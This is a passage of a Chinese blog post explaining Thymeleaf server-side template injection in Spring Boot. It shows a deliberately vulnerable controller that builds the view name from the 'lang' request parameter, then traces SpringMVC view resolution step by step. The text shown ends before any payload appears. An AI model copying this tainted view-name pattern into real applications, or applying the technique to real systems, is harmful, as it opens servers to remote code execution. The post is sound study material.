
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>Thymeleaf SSTI | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E8%AF%AD%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">相关语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SpringMVC-%E8%A7%86%E5%9B%BE%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">SpringMVC 视图解析过程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%81%E8%A3%85ModelAndView%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.2.1.</span> <span class="toc-text">封装ModelAndView对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A7%86%E5%9B%BE"><span class="toc-number">2.2.2.</span> <span class="toc-text">获取视图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%86%E5%9B%BE%E6%B8%B2%E6%9F%93"><span class="toc-number">2.2.3.</span> <span class="toc-text">视图渲染</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E6%98%BE%E5%8E%9F%E7%90%86"><span class="toc-number">2.3.</span> <span class="toc-text">回显原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#templatename"><span class="toc-number">3.1.</span> <span class="toc-text">templatename</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#selector"><span class="toc-number">3.2.</span> <span class="toc-text">selector</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URI-path"><span class="toc-number">3.3.</span> <span class="toc-text">URI path</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">3.3.1.</span> <span class="toc-text">构造回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">3.3.2.</span> <span class="toc-text">分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.</span> <span class="toc-text">修复</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEResponseBody%E6%88%96RestController%E6%B3%A8%E8%A7%A3"><span class="toc-number">4.1.</span> <span class="toc-text">配置ResponseBody或RestController注解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87redirect"><span class="toc-number">4.2.</span> <span class="toc-text">通过redirect:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E5%8F%82%E6%95%B0%E4%B8%AD%E8%AE%BE%E7%BD%AEHttpServletResponse-%E5%8F%82%E6%95%B0"><span class="toc-number">4.3.</span> <span class="toc-text">方法参数中设置HttpServletResponse 参数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E5%A7%BF%E5%8A%BF"><span class="toc-number">5.</span> <span class="toc-text">其它姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%8D%E7%BD%AE"><span class="toc-number">5.1.</span> <span class="toc-text">::位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%81%E7%95%A5"><span class="toc-number">5.2.</span> <span class="toc-text">省略__</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84bypass"><span class="toc-number">6.</span> <span class="toc-text">高版本下的bypass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-x%E7%89%88%E6%9C%AC"><span class="toc-number">7.</span> <span class="toc-text">2.x版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E7%9A%84payload"><span class="toc-number">8.</span> <span class="toc-text">其它的payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE"><span class="toc-number">9.</span> <span class="toc-text">相关题目</span></a></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>Thymeleaf SSTI</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/7/10
        </span>
        
        <span class="category">
            <a href="/blog/categories/Web/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Web
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/Java/" style="color: #ffa2c4">Java</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/SSTI/" style="color: #00bcd4">SSTI</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">4.1k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">17分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>趁热打铁，昨天刚学完thymeleaf引擎今天直接上注入</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10514">https://xz.aliyun.com/t/10514</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254519">https://www.anquanke.com/post/id/254519</a></p>
<p><a target="_blank" rel="noopener" href="https://exp10it.io/2023/02/%E5%AF%B9-thymeleaf-ssti-%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/">https://exp10it.io/2023/02/%E5%AF%B9-thymeleaf-ssti-%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1063.html">https://www.cnpanda.net/sec/1063.html</a></p>
<span id="more"></span>

<p>以这个项目进行漏洞复现：<a target="_blank" rel="noopener" href="https://github.com/veracode-research/spring-view-manipulation">https://github.com/veracode-research/spring-view-manipulation</a></p>
<p>环境jdk1.8 + springboot 2.2.0 +thymeleaf 3.0.11</p>
<hr>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="相关语法"><a href="#相关语法" class="headerlink" title="相关语法"></a>相关语法</h2><p>在<strong>Thymeleaf 3.x 版本</strong>后，新增了<code>~&#123;...&#125;</code>片段表达式，而出现SSTI问题的主要原因也在于此</p>
<p>复习一下语法：</p>
<p><code>~&#123;templatename::selector&#125;</code>**，会在<code>/WEB-INF/templates/</code>目录下寻找名为<code>templatename</code>的模版中定义的<code>fragment</code></p>
<p>如有一个 html 文件的代码如下：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>fragment</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>banquan<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token entity named-entity" title="&copy;">&amp;copy;</span> 2021 ThreeDream yyds<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后在另一template中可以通过片段表达式引用该片段：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>insert</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>~&#123;footer :: banquan&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>th:insert</code>和<code>th:replace</code>插入片段是比较常见的用法</p>
<ul>
<li><code>~&#123;templatename&#125;</code>**：引用整个<code>templatename</code>模版文件作为<code>fragment</code></li>
<li><code>~&#123;::selector&#125;</code> 或 <code>~&#123;this::selector&#125;</code>**：引用来自同一模版文件名为<code>selector</code>的<code>fragmnt</code>。在这里，<code>selector</code>可以是通过<code>th:fragment</code>定义的片段，也可以是类选择器、ID选择器等</li>
<li><strong>当<code>~&#123;&#125;</code>片段表达式中出现<code>::</code>，那么 <code>::</code>后需要有值（也就是<code>selector</code>）</strong></li>
</ul>
<p>Thymeleaf中的<strong>预处理表达式</strong>：<code>__$&#123;expression&#125;__</code>，因为预处理也可以解析执行表达式，也就是说找到一个可以控制预处理表达式的地方，让其解析执行我们的payload即可达到任意代码执行</p>
<br>

<p>现在切入正题</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710173131353.png" alt="image-20240710173131353"></p>
<p>看这里的&#x2F;path路由：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">   <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token keyword">return</span> <span class="token string">"user/"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"/welcome"</span><span class="token punctuation">;</span> <span class="token comment">//template path is tainted</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>乍一看只是一个语言选择的参数lang，但是这里采用的是 thymeleaf 模板，就出现了问题</p>
<blockquote>
<p>在springboot + thymeleaf 中，如果视图名可控，就会导致漏洞的产生。其主要原因就是在控制器中执行 return  后，Spring 会自动调度 Thymeleaf  引擎寻找并渲染模板，在寻找的过程中，会将传入的参数当成SpEL表达式执行，从而导致了远程代码执行漏洞。</p>
</blockquote>
<p>而这里的视图名，就是lang参数，当我们传入参数值en的时候，会正常渲染这里的en&#x2F;welcome.html</p>
<br>

<p>接下来跟一下这个视图解析的过程，其实大部分都是MVC对request的处理流程，在MVC中是DispatcherServlet拦截请求并分发到Handler处理</p>
<h2 id="SpringMVC-视图解析过程分析"><a href="#SpringMVC-视图解析过程分析" class="headerlink" title="SpringMVC 视图解析过程分析"></a>SpringMVC 视图解析过程分析</h2><p>下断点直接定位到<code>DispatcherServlet#doDispatch</code>方法（所有的request和response都会经过该方法）</p>
<p>开始调试，传入<code>/path?lang=en</code></p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710181149064.png" alt="image-20240710181149064"></p>
<p>首先获取到了Handler消息处理，之后进入<code>doDispatch</code>方法的实现，这里重点注意下下面3个方法</p>
<ul>
<li><p><code>ha.handle()</code> ，获取ModelAndView也就是Controller中的return值</p>
</li>
<li><p><code>applyDefaultViewName()</code>，对当前ModelAndView做判断，如果为null则进入defalutViewName部分处理，将URI path作为mav的值</p>
</li>
<li><p><code>processDispatchResult()</code>，处理视图并<strong>解析执行表达式</strong>以及抛出异常回显部分处理</p>
</li>
</ul>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710181729565.png" alt="image-20240710181729565"></p>
<h3 id="封装ModelAndView对象"><a href="#封装ModelAndView对象" class="headerlink" title="封装ModelAndView对象"></a>封装ModelAndView对象</h3><p>先跟进到<code>ha.handle()</code></p>
<p>调用了&#x2F;org&#x2F;springframework&#x2F;web&#x2F;servlet&#x2F;mvc&#x2F;method&#x2F;AbstractHandlerMethodAdapter.class#handleInternal</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710182306729.png" alt="image-20240710182306729"></p>
<p>然后继续跟，一路来到调用<code>invokeHandlerMethod</code>方法，这里就是使用Handler处理request并获取ModelAndView</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710182557297.png" alt="image-20240710182557297"></p>
<p>跟进<code>invokeHandlerMethod</code>到调用<code>invokeAndHandle</code></p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710182924461.png" alt="image-20240710182924461"></p>
<p>跟进<code>invokeAndHandle</code></p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710183221338.png" alt="image-20240710183221338"></p>
<p>可以看到这里做了如下操作：</p>
<ul>
<li><p><code>invokeForRequest</code>会调用Controller后获取返回值到<code>returnValue</code>中</p>
<p>这里的controller是HelloController.java</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token string">"user/"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"/welcome"</span><span class="token punctuation">;</span> <span class="token comment">//template path is tainted</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>判断<code>returnValue</code>是否为空，如果是则继续判断<code>isRequestHandled</code>是否为<code>True</code>，都满足的话设置<code>requestHandled</code>为<code>true</code></p>
</li>
<li><p>通过<code>handleReturnValue</code>根据返回值的类型和返回值将不同的属性设置到<code>ModelAndViewContainer</code>中</p>
</li>
</ul>
<p>总结一下，就是根据用户输入的url，调用相关的controller，并将其返回值<code>returnValue</code>，作为待查找的模板文件名，然后通过Thymeleaf模板引擎去查找，并返回给用户</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710183847319.png" alt="image-20240710183847319"></p>
<p>可以看到经过了<code>invokeForRequest</code>处理后return的字符串和前后缀拼接在了一起，然后在templates目录下寻找模板文件，这里找的就是<code>templates/user/en/welcome.html</code></p>
<p>接下来跟到<code>handleReturnValue</code>方法</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handleReturnValue</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Nullable</span> <span class="token class-name">Object</span> returnValue<span class="token punctuation">,</span> <span class="token class-name">MethodParameter</span> returnType<span class="token punctuation">,</span> <span class="token class-name">ModelAndViewContainer</span> mavContainer<span class="token punctuation">,</span> <span class="token class-name">NativeWebRequest</span> webRequest<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
       <span class="token comment">//获取handler</span>
       <span class="token class-name">HandlerMethodReturnValueHandler</span> handler <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">selectHandler</span><span class="token punctuation">(</span>returnValue<span class="token punctuation">,</span> returnType<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>handler <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Unknown return value type: "</span> <span class="token operator">+</span> returnType<span class="token punctuation">.</span><span class="token function">getParameterType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
           <span class="token comment">//执行handleReturnValue操作</span>
           handler<span class="token punctuation">.</span><span class="token function">handleReturnValue</span><span class="token punctuation">(</span>returnValue<span class="token punctuation">,</span> returnType<span class="token punctuation">,</span> mavContainer<span class="token punctuation">,</span> webRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后进<code>ViewNameMethodReturnValueHandler#handleReturnValue</code>：</p>
<ul>
<li>判断返回值类型是否为字符型，设置<code>mavContainer.viewName</code></li>
<li>判断返回值是否以<code>redirect:</code>开头，如果是的话则设置重定向的属性</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handleReturnValue</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Nullable</span> <span class="token class-name">Object</span> returnValue<span class="token punctuation">,</span> <span class="token class-name">MethodParameter</span> returnType<span class="token punctuation">,</span> <span class="token class-name">ModelAndViewContainer</span> mavContainer<span class="token punctuation">,</span> <span class="token class-name">NativeWebRequest</span> webRequest<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>returnValue <span class="token keyword">instanceof</span> <span class="token class-name">CharSequence</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token class-name">String</span> viewName <span class="token operator">=</span> returnValue<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token comment">//设置返回值为viewName</span>
           mavContainer<span class="token punctuation">.</span><span class="token function">setViewName</span><span class="token punctuation">(</span>viewName<span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token comment">//判断是否需要重定向</span>
           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isRedirectViewName</span><span class="token punctuation">(</span>viewName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
               mavContainer<span class="token punctuation">.</span><span class="token function">setRedirectModelScenario</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>returnValue <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnsupportedOperationException</span><span class="token punctuation">(</span><span class="token string">"Unexpected return type: "</span> <span class="token operator">+</span> returnType<span class="token punctuation">.</span><span class="token function">getParameterType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" in method: "</span> <span class="token operator">+</span> returnType<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过上面的操作，将返回值设置为<code>mavContainer.viewName</code></p>
<p>执行上述操作后返回到<code>RequestMappingHandlerAdapter#invokeHandlerMethod</code>中。通过<code>getModelAndView</code>获取<code>ModelAndView</code>对象</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710185654740.png" alt="image-20240710185654740"></p>
<p><code>getModelAndView</code>根据<code>viewName</code>和<code>model</code>创建<code>ModelAndView</code>对象并返回</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710185924354.png" alt="image-20240710185924354"></p>
<br>

<p>接下来跟进到<code>applyDefaultViewName</code>方法</p>
<p>如果 ModelAndView 值不为null则什么也不做，否则如果<code>defaultViewName</code>存在值则会给 ModelAndView 赋值为 defaultViewName，也就是将 URI path 作为视图名称</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710193340699.png" alt="image-20240710193340699"></p>
<hr>
<h3 id="获取视图"><a href="#获取视图" class="headerlink" title="获取视图"></a>获取视图</h3><p>接下来跟进到<code>processDispatchResult</code>，获取到<code>ModelAndView</code>值后会进入到<code>processDispatchResult</code>方法</p>
<p>第1个if会被跳过，跟进第2个if中的<code>render</code>方法</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710193725373.png" alt="image-20240710193725373"></p>
<p>在<code>render</code>方法中，首先会调用<code>getViewName</code>来获取mv对象的<code>viewName</code></p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710193923360.png" alt="image-20240710193923360"></p>
<p>然后调用<code>resolveViewName</code>方法</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710194219967.png" alt="image-20240710194219967"></p>
